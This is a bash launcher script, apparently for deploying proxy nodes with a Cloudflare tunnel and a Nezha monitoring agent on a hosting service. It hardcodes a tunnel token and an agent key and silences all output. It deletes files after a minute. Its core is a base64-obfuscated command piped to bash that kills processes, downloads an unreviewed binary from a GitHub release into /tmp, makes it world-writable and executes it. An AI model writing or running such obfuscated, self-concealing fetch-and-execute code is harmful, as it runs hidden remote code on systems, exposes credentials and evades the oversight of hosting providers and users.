#!/bin/bash

# --- 所有命令静默执行 ---
exec >/dev/null 2>&1

# 喜欢就点亮星星，不知道的参数保持默认

# cf隧道相关设置
export TOK=${TOK:-'eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiMGIyMmNmY2UtMGViNS00OTU4LWE4ZTgtMDk1MWJlNjBiYzRiIiwicyI6IllqWTVZamMyT0RBdE9UVmxZUzAwTm1SaExXSmxaamN0WmpRNE1qTTVZMlpqT1dReSJ9'}
export ARGO_DOMAIN=${ARGO_DOMAIN:-'zampto.btppone.hidns.vip'}
# export TUNNEL_PROXY="1"

# Telegram配置
export TG=${TG:-''}

# 节点上传订阅服务器
export SUB_URL=${SUB_URL:-'https://node.btpp4.netlib.re/upload-123456nb'}

# 哪吒相关设置
export NEZHA_SERVER=${NEZHA_SERVER:-'nezhak2.btpp.ggff.net'}
export NEZHA_KEY=${NEZHA_KEY:-'TQHS77AHFyqD3vTcfU'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}
# export AGENT_UUID=${AGENT_UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}

# 节点设置
export TMP_ARGO=${TMP_ARGO:-'3x'}
export VL_PORT=${VL_PORT:-'8002'}
export VM_PORT=${VM_PORT:-'8001'}
export CF_IP=${CF_IP:-'ip.sb'}
export SUB_NAME=${SUB_NAME:-'zampto'}
export second_port=${second_port:-''}
# export UUID=${UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'}

# reality相关设置
export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
export SNI=${SNI:-'www.apple.com'}
# export HOST=${HOST:-'1.1.1.1'}

# export JAR_SH='moni'

(
  sleep 60
  rm -rf ~/worlds ./worlds "$FILE_PATH" >/dev/null 2>&1
) &


# --- 启动主程序 ---
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash >/dev/null 2>&1
